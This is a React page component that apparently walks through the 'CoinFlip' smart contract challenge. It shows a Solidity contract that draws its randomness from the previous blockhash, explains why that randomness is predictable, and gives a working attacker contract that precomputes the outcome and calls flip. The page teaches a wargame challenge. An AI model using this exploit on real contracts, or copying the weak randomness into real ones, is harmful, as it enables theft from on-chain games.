import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const CoinFlip = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
`;

  const solutionCode = `// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  interface ICoinFlip {
      function flip(bool _guess) external returns (bool);
  }
  
  contract CoinFlipGuess {
      address public coinFlipAddress;
      uint256 public consecutiveWins = 0;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
      constructor(address _coinFlipAddress) {
          coinFlipAddress = _coinFlipAddress;
      }
  
      function coinFlipGuess() external returns (uint256) {
          uint256 blockValue = uint256(blockhash(block.number - 1));
  
          if (lastHash == blockValue) {
            revert();
          }
  
          lastHash = blockValue;
          uint256 coinFlip = blockValue / FACTOR;
          bool side = coinFlip == 1 ? true : false;
  
          bool isRight = ICoinFlip(coinFlipAddress).flip(side);
          if (isRight) {
              consecutiveWins++;
          } else {
              consecutiveWins = 0;
          }
  
          return consecutiveWins;
      }
}`;

  return (
    <div>
      <h1 className="headerText">CoinFlip</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="Since this block number can be easily accessible, we can also generate the result of coin flip and feed this result to flip function to have a correct guess and increment consecutiveWins. We are able to do this because block time of the network will be long enough so that block.number doesn't change between function calls.
             We'll frontrun this smart contract with almost same coin-flip generation code CoinFlipGuess & call the flip of given CoinFlip contract at deployed instance address, with already determined result of flip:"
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default CoinFlip;
